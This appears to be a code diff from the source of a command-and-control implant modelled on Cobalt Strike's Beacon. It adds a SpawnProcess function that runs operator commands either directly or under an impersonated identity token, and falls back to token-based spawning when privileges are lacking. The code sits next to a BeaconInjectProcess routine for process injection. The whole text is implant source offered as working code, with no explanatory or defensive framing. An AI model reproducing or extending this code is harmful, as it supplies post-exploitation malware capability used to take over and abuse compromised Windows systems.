@@ -1079,7 +1079,59 @@ BOOL  SpawnProcessWithTokenOrLogon(RUN_UNDER_CONFIG* runUnderConfig)
 		LERROR("Could not run command(w / token) because of its length of %d", runUnderConfig->cmdLength);
 		BeaconErrorD(ERROR_LENGTHY_WIDECHAR_COMMAND, runUnderConfig->cmdLength);
 	}
+
 	return FALSE;
+}
+
+BOOL SpawnProcess(RUN_UNDER_CONFIG* execution)
+{
+	int lastError;
+
+	if (!gIdentityToken || execution->toggleImpersonation)
+	{
+		if (!CreateProcessA(
+			NULL,
+			execution->cmd,
+			NULL,
+			NULL,
+			TRUE,
+			execution->creationFlags,
+			NULL,
+			NULL,
+			execution->startupInfo,
+			execution->processInfo))
+		{
+			lastError = GetLastError();
+			LERROR("Could not spawn %s: %s", execution->cmd, LAST_ERROR_STR(lastError));
+			BeaconErrorDS(ERROR_SPAWN_PROCESS_FAILED, lastError, execution->cmd);
+			return FALSE;
+		}
+	}
+	else if (!CreateProcessAsUserA(
+		gIdentityToken,
+		NULL,
+		execution->cmd,
+		NULL,
+		NULL,
+		TRUE,
+		execution->creationFlags,
+		NULL,
+		NULL,
+		execution->startupInfo,
+		execution->processInfo))
+	{
+		lastError = GetLastError();
+		if (lastError == ERROR_PRIVILEGE_NOT_HELD && CreateProcessWithTokenW)
+		{
+			LWARNING("Could not spawn %s (token): %s", execution->cmd, LAST_ERROR_STR(lastError));
+			return SpawnProcessWithTokenOrLogon(execution);
+		}
+
+		LERROR("Could not spawn %s (token): %s", execution->cmd, LAST_ERROR_STR(lastError));
+		BeaconErrorDS(ERROR_SPAWN_PROCESS_AS_USER_FAILED, lastError, execution->cmd);
+		return FALSE;
+	}
+	return TRUE;
 }
 
 void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
